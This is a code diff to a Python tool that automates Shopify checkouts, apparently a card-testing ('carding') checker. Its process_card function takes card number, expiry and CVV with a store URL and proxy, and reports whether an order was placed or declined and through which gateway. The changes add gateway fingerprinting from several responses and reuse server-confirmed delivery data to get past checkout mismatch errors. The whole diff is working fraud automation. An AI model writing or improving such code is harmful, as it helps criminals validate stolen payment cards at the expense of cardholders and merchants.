@@ -314,6 +314,60 @@ def is_captcha_required(response_text):
 # =====================================================================
 _GENERIC_PAYMENT_CODES = {'GENERIC_ERROR', 'PAYMENT_FAILED', ''}
 
+# Gateway detection mapping from payment method names/typeNames
+_GATEWAY_MAP = {
+    'shopify_payments': 'shopify_payments',
+    'stripe': 'stripe',
+    'braintree': 'braintree',
+    'authorize_net': 'authorize_net',
+    'authorize.net': 'authorize_net',
+    'paypal': 'paypal',
+    'cybersource': 'cybersource',
+    'worldpay': 'worldpay',
+    'adyen': 'adyen',
+    'checkout_com': 'checkout_com',
+    'first_data': 'first_data',
+    'global_payments': 'global_payments',
+    'sage_pay': 'sage_pay',
+    'payflow': 'payflow',
+    'payeezy': 'payeezy',
+    'moneris': 'moneris',
+    'mollie': 'mollie',
+    'bogus': 'bogus',
+    # Type name patterns
+    'DirectPaymentMethod': 'shopify_payments',
+    'CreditCardPaymentMethod': 'shopify_payments',
+}
+
+
+def _detect_gateway_from_payment(pm_name, pm_typename=''):
+    """Detect gateway name from payment method name and typename.
+    
+    Returns the canonical gateway name, or None if not detected.
+    """
+    if not pm_name and not pm_typename:
+        return None
+    
+    # Check payment method name against known gateways
+    name_lower = (pm_name or '').lower().strip()
+    for key, gw in _GATEWAY_MAP.items():
+        if key in name_lower:
+            return gw
+    
+    # Check typename
+    type_lower = (pm_typename or '').lower().strip()
+    for key, gw in _GATEWAY_MAP.items():
+        if key in type_lower:
+            return gw
+    
+    # If we have a name but no match, return the name itself as gateway
+    if name_lower and name_lower not in ('shop_pay', 'apple_pay', 'google_pay', 
+                                          'paypal_express', 'shopify_installments',
+                                          'wallet', 'gift_card', 'offsite'):
+        return name_lower
+    
+    return None
+
 
 def _is_generic_payment_code(value):
     return str(value or '').strip().upper() in _GENERIC_PAYMENT_CODES
@@ -664,6 +718,11 @@ def _parse_negotiate_response(resp_json):
         'seller_properties': None,
         'seller_taxable': None,
         'seller_gift_card': None,
+        # Server-confirmed delivery lines for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED fix
+        'server_delivery_lines': [],
+        # Gateway detection from payment terms
+        'gateway_name': None,
+        'gateway_type': None,
     }
     
     data = resp_json.get('data', {})
@@ -717,19 +776,65 @@ def _parse_negotiate_response(resp_json):
             result['delivery_resolved'] = True
             delivery_lines = delivery_obj.get('deliveryLines', [])
             strategies = []
+            # Store full server-confirmed delivery lines for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED fix
+            server_delivery_lines = []
             for dl in delivery_lines:
                 methods = dl.get('deliveryMethodTypes', [])
-                # If we have deliveryMethodTypes, create strategy entries
+                # Extract the server-confirmed delivery strategy handle and price
+                sel_strategy = dl.get('selectedDeliveryStrategy', {})
+                strategy_by_handle = sel_strategy.get('deliveryStrategyByHandle', {})
+                server_handle = strategy_by_handle.get('handle', '')
+                server_custom_rate = strategy_by_handle.get('customDeliveryRate', False)
+                # Extract server-confirmed expectedTotalPrice
+                server_price_obj = dl.get('expectedTotalPrice', {})
+                server_price_amount, server_price_currency = _extract_money(server_price_obj)
+                # Extract server-confirmed destination
+                server_dest = dl.get('destination', {})
+                server_street_addr = server_dest.get('streetAddress', {})
+                
+                # Build a complete strategy entry with server-confirmed data
+                dl_strategy = {
+                    'code': methods[0] if methods else 'SHIPPING',
+                    'handle': server_handle or 'shipping',
+                    'breakdown': [],
+                    'name': methods[0] if methods else 'SHIPPING',
+                    'server_price': server_price_amount,
+                    'server_price_currency': server_price_currency,
+                    'server_custom_rate': server_custom_rate,
+                }
+                strategies.append(dl_strategy)
+                
+                # Store the full server-confirmed delivery line for reuse in submit
+                server_dl = {
+                    'deliveryMethodTypes': methods or ['SHIPPING'],
+                    'selectedDeliveryStrategy': {
+                        'deliveryStrategyByHandle': {
+                            'handle': server_handle or 'shipping',
+                            'customDeliveryRate': server_custom_rate,
+                        },
+                    },
+                    'destination': server_dest if server_dest else None,
+                    'expectedTotalPrice': server_price_obj if server_price_obj else {'any': True},
+                    'targetMerchandiseLines': dl.get('targetMerchandiseLines', {'any': True}),
+                }
+                # Remove None values
+                server_dl = {k: v for k, v in server_dl.items() if v is not None}
+                server_delivery_lines.append(server_dl)
+                
+                # If we have deliveryMethodTypes, create strategy entries (legacy compat)
                 if methods:
-                    for m in methods:
+                    for m in methods[1:]:  # Already added first method above
                         strategies.append({
                             'code': m,
-                            'handle': 'shipping',
+                            'handle': server_handle or 'shipping',
                             'breakdown': [],
                             'name': m,
+                            'server_price': server_price_amount,
+                            'server_price_currency': server_price_currency,
                         })
             
             result['shipping_strategies'] = strategies
+            result['server_delivery_lines'] = server_delivery_lines
         
         elif delivery_typename == 'PendingTerms':
             result['delivery_resolved'] = False
@@ -746,14 +851,24 @@ def _parse_negotiate_response(resp_json):
                 pm = apl.get('paymentMethod', {})
                 pmi = pm.get('paymentMethodIdentifier', '')
                 pm_name = pm.get('name', '')
+                pm_typename = pm.get('__typename', '')
+                # Detect gateway from payment method name
+                _gw = _detect_gateway_from_payment(pm_name, pm_typename)
+                if _gw and not result['gateway_name']:
+                    result['gateway_name'] = _gw
                 # Prefer shopify_payments
                 if pm_name == 'shopify_payments' and pmi:
                     result['payment_method_identifier'] = pmi
+                    result['gateway_name'] = 'shopify_payments'
+                    result['gateway_type'] = pm_typename
                     break
                 # Fallback: first non-wallet, non-giftcard payment
                 if pmi and not result['payment_method_identifier']:
                     if pm_name not in ('SHOP_PAY', 'APPLE_PAY', 'GOOGLE_PAY', 'PAYPAL_EXPRESS', 'SHOPIFY_INSTALLMENTS'):
                         result['payment_method_identifier'] = pmi
+                        if not result['gateway_name']:
+                            result['gateway_name'] = _gw or pm_name
+                            result['gateway_type'] = pm_typename
         
         # Extract stableIds from sellerProposal.merchandise
         # Also extract server-confirmed merchandise details (variantId, price, etc.)
@@ -1585,6 +1700,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             checkout_total = p1_parsed['checkout_total']
             checkout_total_currency = p1_parsed['checkout_total_currency']
             is_shipping_required = p1_parsed['is_shipping_required']
+            # Server-confirmed delivery lines for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED fix
+            server_delivery_lines = p1_parsed.get('server_delivery_lines', [])
+            # Gateway detection from negotiate response
+            if p1_parsed.get('gateway_name'):
+                gateway = p1_parsed['gateway_name']
+                print(f'[GATEWAY] Detected from negotiate: {gateway}', file=sys.stderr)
 
             # ======== USE SERVER-CONFIRMED MERCHANDISE DETAILS ========
             # If the seller proposal confirmed our merchandise, update our local
@@ -1695,6 +1816,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         if dp_parsed['delivery_resolved']:
                             delivery_resolved = True
                             shipping_strategies = dp_parsed['shipping_strategies']
+                            if dp_parsed.get('server_delivery_lines'):
+                                server_delivery_lines = dp_parsed['server_delivery_lines']
                             print(f'[DELIVERY_POLL] Resolved! strategies={len(shipping_strategies)}', file=sys.stderr)
                         
                         # Always update tax and totals from latest response
@@ -1709,6 +1832,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             stable_ids = dp_parsed['stable_ids']
                         if not dp_parsed['is_shipping_required']:
                             is_shipping_required = False
+                        # Update gateway from delivery poll
+                        if dp_parsed.get('gateway_name') and gateway == 'UNKNOWN':
+                            gateway = dp_parsed['gateway_name']
                         
                     except (json.JSONDecodeError, KeyError, TypeError):
                         pass
@@ -1843,6 +1969,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             payment_method_identifier = tax_parsed['payment_method_identifier']
                         if tax_parsed['stable_ids']:
                             stable_ids = tax_parsed['stable_ids']
+                        # Update server delivery lines from tax acceptance
+                        if tax_parsed.get('server_delivery_lines'):
+                            server_delivery_lines = tax_parsed['server_delivery_lines']
+                        # Update gateway from tax acceptance
+                        if tax_parsed.get('gateway_name') and gateway == 'UNKNOWN':
+                            gateway = tax_parsed['gateway_name']
+                            print(f'[GATEWAY] Updated from tax_accept: {gateway}', file=sys.stderr)
 
                         print(f'[TAX_ACCEPT] result_type={tax_parsed["result_type"]} checkout_total={checkout_total} tax={tax_total}', file=sys.stderr)
 
@@ -1956,6 +2089,27 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 )
             else:
                 paymentMethodIdentifier = payment_method_identifier
+            
+            # Gateway detection from checkout page HTML
+            # Look for gateway identifiers in the checkout page script data
+            if gateway == 'UNKNOWN':
+                _checkout_gw = None
+                # Check for shopify_payments in checkout data
+                if 'shopify_payments' in checkout_text:
+                    _checkout_gw = 'shopify_payments'
+                # Check for other gateways in checkout page
+                elif '"gateway":"' in checkout_text:
+                    _gw_match = re.search(r'"gateway"\s*:\s*"([^"]+)"', checkout_text)
+                    if _gw_match:
+                        _checkout_gw = _gw_match.group(1)
+                elif '"paymentGateway"' in checkout_text:
+                    _gw_match2 = re.search(r'"paymentGateway"\s*:\s*"([^"]+)"', checkout_text)
+                    if _gw_match2:
+                        _checkout_gw = _gw_match2.group(1)
+                if _checkout_gw:
+                    _detected = _detect_gateway_from_payment(_checkout_gw, '')
+                    gateway = _detected or _checkout_gw
+                    print(f'[GATEWAY] Detected from checkout page: {gateway}', file=sys.stderr)
 
             # If stable_ids weren't found from seller proposal, try extraction from checkout page
             if not stable_ids:
@@ -2182,6 +2336,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 currency = p2_parsed['checkout_total_currency']
             if p2_parsed['tax_total'] and p2_parsed['tax_total'] != '0':
                 tax_total = p2_parsed['tax_total']
+            # Update gateway from Proposal 2 (payment negotiate — most accurate gateway source)
+            if p2_parsed.get('gateway_name') and gateway == 'UNKNOWN':
+                gateway = p2_parsed['gateway_name']
+                print(f'[GATEWAY] Updated from proposal2: {gateway}', file=sys.stderr)
+            # Update server delivery lines from Proposal 2
+            if p2_parsed.get('server_delivery_lines'):
+                server_delivery_lines = p2_parsed['server_delivery_lines']
 
             # If Proposal 2 already returned SubmittedForCompletion, go to poll
             receipt_id = None
@@ -2249,41 +2410,52 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
                 pp = payment_proposal_input.get('purchaseProposal', payment_proposal_input)
 
-                # Build delivery using stableId references only
+                # Build delivery using server-confirmed data when available
+                # KEY FIX for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED:
+                # Use server_delivery_lines from negotiate response if available,
+                # as they contain the exact server-confirmed delivery data.
                 submit_delivery = pp.get('delivery')
                 if is_shipping_required and stable_ids:
-                    # Calculate shipping amount for submit delivery
-                    _ship_amount = None
-                    if total_price and total_price != '0':
-                        try:
-                            _total_f = float(total_price)
-                            _price_f = float(price) if price else 0
-                            _ship_est = max(0, _total_f - _price_f)
-                            if _ship_est > 0:
-                                _ship_amount = f'{_ship_est:.2f}'
-                        except (ValueError, TypeError):
-                            pass
-                    submit_delivery_line = _build_delivery_line(
-                        currency=currency,
-                        first_name=firstName,
-                        last_name=lastName,
-                        street=street,
-                        city=city,
-                        country_code=country_code,
-                        zone_code=state,
-                        postal_code=s_zip,
-                        phone=phone,
-                        shipping_handle=selected_handle,
-                        shipping_amount=_ship_amount,
-                    )
-                    # Use stableId-only references for target merchandise lines
-                    submit_delivery_line['targetMerchandiseLines'] = {
-                        'lines': [{'stableId': sid} for sid in stable_ids]
-                    }
-                    submit_delivery = _build_delivery_terms(
-                        delivery_lines=[submit_delivery_line],
-                        no_delivery_required=[],
-                    )
+                    if server_delivery_lines:
+                        # Use server-confirmed delivery lines — these have the exact
+                        # strategy handle, destination, and expectedTotalPrice that the
+                        # server expects. Update stableId references and use {any: True}
+                        # for expectedTotalPrice to prevent detail mismatch.
+                        for sdl in server_delivery_lines:
+                            sdl['targetMerchandiseLines'] = {
+                                'lines': [{'stableId': sid} for sid in stable_ids]
+                            }
+                            # Accept any price the server calculated
+                            sdl['expectedTotalPrice'] = {'any': True}
+                        submit_delivery = _build_delivery_terms(
+                            delivery_lines=server_delivery_lines,
+                            no_delivery_required=[],
+                        )
+                        print(f'[SUBMIT_DL] Using server-confirmed delivery lines ({len(server_delivery_lines)}) with any price', file=sys.stderr)
+                    else:
+                        # Fallback: Calculate shipping amount for submit delivery
+                        _ship_amount = None
+                        submit_delivery_line = _build_delivery_line(
+                            currency=currency,
+                            first_name=firstName,
+                            last_name=lastName,
+                            street=street,
+                            city=city,
+                            country_code=country_code,
+                            zone_code=state,
+                            postal_code=s_zip,
+                            phone=phone,
+                            shipping_handle=selected_handle,
+                            shipping_amount=_ship_amount,  # {any: true} by default
+                        )
+                        # Use stableId-only references for target merchandise lines
+                        submit_delivery_line['targetMerchandiseLines'] = {
+                            'lines': [{'stableId': sid} for sid in stable_ids]
+                        }
+                        submit_delivery = _build_delivery_terms(
+                            delivery_lines=[submit_delivery_line],
+                            no_delivery_required=[],
+                        )
 
                 submit_input = {
                     'sessionInput': {'sessionToken': x_checkout_one_session_token},
@@ -2504,27 +2676,40 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     stable_ids = _reneg_parsed['stable_ids']
                                 # Update delivery from re-negotiation
                                 # When DELIVERY_DELIVERY_LINE_DETAIL_CHANGED, the server
-                                # recalculated delivery. We need to rebuild our delivery
-                                # with the seller's confirmed strategy and amount.
-                                # KEY FIX: Use the checkout_total minus merchandise price as
-                                # the shipping + tax total for the delivery expectedTotalPrice.
-                                if _reneg_parsed['shipping_strategies']:
+                                # recalculated delivery. We MUST use the server's confirmed
+                                # delivery lines instead of rebuilding from scratch.
+                                # KEY FIX: Use server_delivery_lines from _parse_negotiate_response
+                                # which contains the exact server-confirmed delivery data.
+                                _reneg_server_dl = _reneg_parsed.get('server_delivery_lines', [])
+                                if _reneg_server_dl and is_shipping_required:
+                                    # Use the server-confirmed delivery lines directly
+                                    # Update stableId references in targetMerchandiseLines
+                                    for sdl in _reneg_server_dl:
+                                        if stable_ids:
+                                            sdl['targetMerchandiseLines'] = {
+                                                'lines': [{'stableId': sid} for sid in stable_ids]
+                                            }
+                                        # Use {any: true} for expectedTotalPrice to accept
+                                        # whatever the server calculated (this is what real
+                                        # Shopify checkout does after DELIVERY_LINE_DETAIL_CHANGED)
+                                        sdl['expectedTotalPrice'] = {'any': True}
+                                    
+                                    _new_delivery_terms = _build_delivery_terms(
+                                        delivery_lines=_reneg_server_dl,
+                                        no_delivery_required=[],
+                                    )
+                                    # Update in submit input
+                                    submit_data['variables']['input']['delivery'] = _new_delivery_terms
+                                    pp['delivery'] = _new_delivery_terms
+                                    print(f'[RENEG_DL] Using server-confirmed delivery lines ({len(_reneg_server_dl)}) with any price', file=sys.stderr)
+                                elif _reneg_parsed['shipping_strategies']:
                                     shipping_strategies = _reneg_parsed['shipping_strategies']
-                                    # Rebuild delivery line with updated strategy
+                                    # Fallback: Rebuild delivery line with updated strategy
                                     if is_shipping_required:
                                         _handle_strategies = [s for s in shipping_strategies if s.get('handle')]
                                         if _handle_strategies:
                                             selected_handle = _handle_strategies[0]['handle']
-                                        # Calculate shipping amount from checkout_total - price - estimated_tax
-                                        _shipping_est = '0'
-                                        if total_price and total_price != '0':
-                                            try:
-                                                _total_f = float(total_price)
-                                                _price_f = float(price) if price else 0
-                                                _ship_est = max(0, _total_f - _price_f)
-                                                _shipping_est = f'{_ship_est:.2f}'
-                                            except (ValueError, TypeError):
-                                                pass
+                                        # Use {any: true} for expectedTotalPrice to accept server's price
                                         _new_dl = _build_delivery_line(
                                             currency=currency,
                                             first_name=firstName,
@@ -2536,7 +2721,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                             postal_code=s_zip,
                                             phone=phone,
                                             shipping_handle=selected_handle,
-                                            shipping_amount=_shipping_est if _shipping_est != '0' else None,
+                                            shipping_amount=None,  # {any: true} — accept any amount
                                         )
                                         if stable_ids:
                                             _new_dl['targetMerchandiseLines'] = {
@@ -2549,6 +2734,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                         # Update in submit input
                                         submit_data['variables']['input']['delivery'] = _new_delivery_terms
                                         pp['delivery'] = _new_delivery_terms
+                                        print(f'[RENEG_DL] Rebuilt delivery line with handle={selected_handle} any price', file=sys.stderr)
                                 # Update merchandise from re-negotiation (seller-confirmed)
                                 if _reneg_parsed.get('seller_variant_id'):
                                     _svid = _reneg_parsed['seller_variant_id']
@@ -2707,20 +2893,48 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, "POLL_JSON_ERROR: Invalid JSON", gateway, total_price, currency
 
             # Extract gateway from poll response
+            # Multiple sources for gateway detection:
+            # 1. shopify_payments field in receipt
+            # 2. gatewayCode from processingError
+            # 3. payment_method_identifier from negotiate
+            # 4. Known gateway strings in response
             _sp = _dget(res_json, 'data', 'receipt', 'shopify_payments')
             if _sp and isinstance(_sp, dict):
                 gateway = 'shopify_payments'
-            if payment_method_identifier:
-                gateway = payment_method_identifier
-
+            
+            # Extract gatewayCode from processingError (most reliable for declined cards)
+            _receipt = res_json.get('data', {}).get('receipt', {})
+            _receipt_type = _receipt.get('__typename', '') if _receipt else ''
+            _pe = _receipt.get('processingError', {}) if _receipt else {}
+            if _pe:
+                _gw_code = _pe.get('gatewayCode', '')
+                if _gw_code:
+                    # gatewayCode directly tells us the gateway
+                    _detected_gw = _detect_gateway_from_payment(_gw_code, '')
+                    gateway = _detected_gw or _gw_code
+                    print(f'[GATEWAY] Detected from poll gatewayCode: {gateway}', file=sys.stderr)
+                # Also try processorCode
+                _proc_code = _pe.get('processorCode', '')
+                if _proc_code and gateway == 'UNKNOWN':
+                    gateway = _proc_code
+                    print(f'[GATEWAY] Detected from poll processorCode: {gateway}', file=sys.stderr)
+            
+            # If still UNKNOWN, check payment_method_identifier
+            if gateway == 'UNKNOWN' and payment_method_identifier:
+                # payment_method_identifier often contains gateway info
+                _pmi_gw = _detect_gateway_from_payment(payment_method_identifier, '')
+                gateway = _pmi_gw or payment_method_identifier
+            
             # Check for ORDER_PLACED
             if "shopify_payments" in str(res_json) or "ProcessedReceipt" in str(res_json):
                 gateway = 'shopify_payments'
                 return True, "ORDER_PLACED", gateway, total_price, currency
 
-            # Extract receipt processing error
-            _receipt = res_json.get('data', {}).get('receipt', {})
-            _receipt_type = _receipt.get('__typename', '') if _receipt else ''
+            # Extract receipt processing error (reuse _receipt, _receipt_type, _pe from above)
+            if not _receipt:
+                _receipt = res_json.get('data', {}).get('receipt', {})
+                _receipt_type = _receipt.get('__typename', '') if _receipt else ''
+                _pe = _receipt.get('processingError', {}) if _receipt else {}
 
             if _receipt_type == 'FailedReceipt':
                 _pe = _receipt.get('processingError', {})
